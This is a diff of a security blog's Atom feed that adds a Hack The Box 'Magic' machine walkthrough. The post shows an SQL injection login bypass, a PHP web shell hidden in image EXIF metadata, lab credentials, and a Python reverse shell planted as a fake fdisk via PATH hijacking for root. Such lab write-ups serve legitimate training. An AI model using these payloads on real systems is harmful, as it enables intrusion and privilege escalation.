@@ -1,5 +1,169 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-08-17T02:29:43+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">r3dw0lf_sec</title><subtitle>Official r3dw0lfsec blog. Follow this blog for awesome Infosec Articles</subtitle><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><entry><title type="html">Traceback Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/traceback.html" rel="alternate" type="text/html" title="Traceback Machine Walkthrough" /><published>2020-08-15T00:00:00+05:30</published><updated>2020-08-15T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/traceback</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/traceback.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.”&lt;/em&gt;&lt;/strong&gt; - Chanda Kochhar&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-08-24T02:49:02+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">r3dw0lf_sec</title><subtitle>Official r3dw0lfsec blog. Follow this blog for awesome Infosec Articles</subtitle><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><entry><title type="html">Magic Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/magic.html" rel="alternate" type="text/html" title="Magic Machine Walkthrough" /><published>2020-08-23T00:00:00+05:30</published><updated>2020-08-23T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/magic</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/magic.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Any sufficiently advanced technology is indistinguishable from magic.”&lt;/em&gt;&lt;/strong&gt; - Arthur C. Clarke&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/machine.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#machine-matrix&quot; id=&quot;markdown-toc-machine-matrix&quot;&gt;Machine Matrix&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-80&quot; id=&quot;markdown-toc-enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#bypassing-authentication-through-sqli&quot; id=&quot;markdown-toc-bypassing-authentication-through-sqli&quot;&gt;Bypassing Authentication Through SQLI&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#acquiring-initial-foothold-as-www-data&quot; id=&quot;markdown-toc-acquiring-initial-foothold-as-www-data&quot;&gt;Acquiring Initial Foothold as www-data&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#acquiring-user-shell---theseus&quot; id=&quot;markdown-toc-acquiring-user-shell---theseus&quot;&gt;Acquiring User Shell - Theseus&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#acquiring-root-privileges&quot; id=&quot;markdown-toc-acquiring-root-privileges&quot;&gt;Acquiring Root Privileges&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;machine-matrix&quot;&gt;Machine Matrix&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/matrix.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;machine-summary&quot;&gt;Machine Summary&lt;/h2&gt;
+&lt;p&gt;Box is a linux machine that has a webserver running whose authentication can be bypassed through SQL Injection. There is a file upload functionality that can be bypassed which grants the low privileged shell. There is a php file which has stored credentials for mysqlservice, we can get the user credentials through accessing the tables. Replacing the fdisk file malicious file (reverse shell) and adding the path grants the root privilege as sysinfo binary indirectly pulls fdisk.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h2&gt;
+&lt;p&gt;I started the enumeration with nmap scan&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.185
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/nmap.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The box had two ports open&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Port&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Service&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;SSH&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Apache&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/h2&gt;
+&lt;p&gt;I ran dirbuster that revealed a folder /images/uploads but it was forbidden&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But the contents and files of the folder can be accessed&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I guessed the inital foothold path i.e i need to find a way to upload a file ( that contains the shell code) and trigger it. I started enumerating on the web application.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;bypassing-authentication-through-sqli&quot;&gt;Bypassing Authentication Through SQLI&lt;/h2&gt;
+&lt;p&gt;Application had a login page and the authentication can be bypassed through SQL Injection.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'or'1'='1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;There is a upload functionality so i tried to put a webshell but i wasn’t able to directly upload it. I also tried to bypass upload restrictions through changing the extension of the file to .php.png and content type from application to image/png but that also failed.&lt;/p&gt;
+
+&lt;h2 id=&quot;acquiring-initial-foothold-as-www-data&quot;&gt;Acquiring Initial Foothold as www-data&lt;/h2&gt;
+&lt;p&gt;Upon researching a bit, i found a way to add a malicious code (web-shell) to meta data of a image file through using exif tool.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exiftool &lt;span class=&quot;nt&quot;&gt;-Comment&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php echo &quot;&amp;lt;pre&amp;gt;&quot;; system($_GET['&lt;/span&gt;cmd&lt;span class=&quot;s1&quot;&gt;']); ?&amp;gt;'&lt;/span&gt; file.jpg &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;file.jpg file.php.jpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon loading the file on browser, it looks like crap.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon viewing on Burp, it made sense.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In order to get a proper reverse shell, i decided to upload a php reverse shell and triger that&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;IP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I started the listener on my attacking machine&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;PORT&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I got the initial foothold as www-data.&lt;/p&gt;
+
+&lt;h2 id=&quot;acquiring-user-shell---theseus&quot;&gt;Acquiring User Shell - Theseus&lt;/h2&gt;
+
+&lt;p&gt;Upon enumerating the directories i found a juicy file &lt;strong&gt;db.php&lt;/strong&gt; in the directory &lt;strong&gt;/var/www/Magic&lt;/strong&gt;. The file had credentials of the user &lt;strong&gt;theseus&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dbUsername = theseus
+dbPassword = iamkingtheseus
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried to login over MySQL Service and SSH but both failed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon researching a bit got to know about the command &lt;strong&gt;mysqldump&lt;/strong&gt; that is used to backup, restore and dump the database.&lt;/p&gt;
+
+&lt;p&gt;I used that to dump the entire Magic database&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysqldump &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; theseus &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Magic
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I got a new set of credentials for the user theseus&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username: admin
+password: Th3s3usW4sK1ng
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I tried to login into the theseus account using the obtained password over ssh. I got the user shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;acquiring-root-privileges&quot;&gt;Acquiring Root Privileges&lt;/h2&gt;
+&lt;p&gt;I ran linPeas that gave some information, sysinfo belongs to the root but can be executed by the user theseus. I executed the sysinfo command, it displayed more information then a normal sysinfo command would. After researching a bit, I found that information that gets revealed while executing fdisk command also revealed while executing sysinfo in the machine. &lt;strong&gt;binary fdisk is getting executed indirectly when sysinfo is executed&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;I created a python script that would grant me the reverse shell with the name &lt;strong&gt;fdisk&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.54&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I downloaded the file in the victim machine at tmp directory but when sysinfo gets executed fdisk in the bin directory gets executed. so i need to set the path to tmp directory.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I started the listener in my attacker machine and again executed sysinfo, fdisk in the /tmp/ directory got executed and i got the reverse shell with root privileges.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/magic/pwned.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Happy Hacking !&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="Hackthebox" /><summary type="html">“Any sufficiently advanced technology is indistinguishable from magic.” - Arthur C. Clarke</summary></entry><entry><title type="html">Traceback Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/traceback.html" rel="alternate" type="text/html" title="Traceback Machine Walkthrough" /><published>2020-08-15T00:00:00+05:30</published><updated>2020-08-15T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/traceback</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/traceback.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.”&lt;/em&gt;&lt;/strong&gt; - Chanda Kochhar&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/machine.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#machine-matrix&quot; id=&quot;markdown-toc-machine-matrix&quot;&gt;Machine Matrix&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-80&quot; id=&quot;markdown-toc-enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#acquiring-initial-foothold-webadmin&quot; id=&quot;markdown-toc-acquiring-initial-foothold-webadmin&quot;&gt;Acquiring Initial Foothold (Webadmin)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#acquiring-user-shell-sysadmin&quot; id=&quot;markdown-toc-acquiring-user-shell-sysadmin&quot;&gt;Acquiring User Shell (Sysadmin)&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#acquiring-root-shell&quot; id=&quot;markdown-toc-acquiring-root-shell&quot;&gt;Acquiring Root Shell&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;h2 id=&quot;machine-matrix&quot;&gt;Machine Matrix&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/traceback/matrix.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
